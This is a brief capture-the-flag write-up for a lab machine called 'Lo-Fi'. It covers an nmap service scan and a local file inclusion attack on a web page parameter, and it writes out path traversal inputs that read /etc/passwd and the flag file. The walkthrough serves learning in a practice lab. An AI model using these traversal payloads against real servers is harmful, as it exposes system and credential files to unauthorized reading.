# Lo-Fi write-up

First we define the IP
```
IP=xx.xx.xxx.xxx
```
## Nmap Scan
I started analyzing the environment using __`nmap`__  to discover open ports 

```
nmap -sV -sC -oN nmap_scan $IP
```

> - `-sV`: Detect service/version
> - `-sC`: Run default scripts
> - `-oN`: Output to file (normal format)



![image](https://github.com/user-attachments/assets/d8e915e9-250b-4fe4-817e-5fe510265fc2)

We see that port `80 (HTTP)` is open


![image](https://github.com/user-attachments/assets/ee77abff-0f66-4f70-8e99-76f8b7c0806d)

Let's try exploiting something here...



![image](https://github.com/user-attachments/assets/df9b828d-4d57-47cb-9681-6f63c5d21179)

With
```
?page=/../../../../etc/passwd
```
![image](https://github.com/user-attachments/assets/d16fa1dc-9e99-4ad1-9d33-f8593588a656)

Not good... but not bad either 
----
Let s try without the root directory first 


```
?page=../../../../etc/passwd
```

![image](https://github.com/user-attachments/assets/9a7fa12b-6a74-4b1a-a9d9-d7398edf184e)

Perfect 👑
Now... where is the flag ? After some deep digging ... 2h 🥹 I found it in 
```
?page=../../../../flag.txt
```
![image](https://github.com/user-attachments/assets/974754f1-b5aa-4848-bbbd-584c8925605a)

 ## Conclusion
- The web server was vulnerable to LFI.
- The flag was located in `/flag.txt`.
- Took around 2 hours to find the exact path.





